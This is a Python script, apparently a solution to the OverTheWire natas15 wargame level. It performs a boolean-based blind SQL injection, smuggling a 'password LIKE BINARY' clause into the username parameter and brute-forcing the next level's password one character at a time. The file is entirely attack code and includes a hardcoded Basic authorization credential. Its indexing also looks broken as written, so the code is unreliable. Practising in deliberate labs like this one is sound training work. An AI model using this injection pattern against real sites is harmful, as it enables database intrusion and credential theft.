import requests

chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
test = []

url = "http://natas15.natas.labs.overthewire.org"
useragent = "Mozilla/5.0 (X11; Linux i686; rv:61.0) Gecko/20100101 Firefox/61.0"
auth = "Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=="

headers = {"User-Agent":useragent, "Authorization":auth}

j = 1
while (True):
	test.append("0")
	for i in range(len(chars)):

		test[j] = chars[i]

		arg = "natas16\" AND password LIKE BINARY \""+"".join(test)+"%"
		params = {"username":arg}

		r = requests.post(url, headers=headers, params=params)
		resp = r.text

		if("This user exists." in resp):
			print("right {}".format("".join(test)))
			j+=1
			break
		else:
			print("wrong {}".format("".join(test)))
	if(j==32):
		break
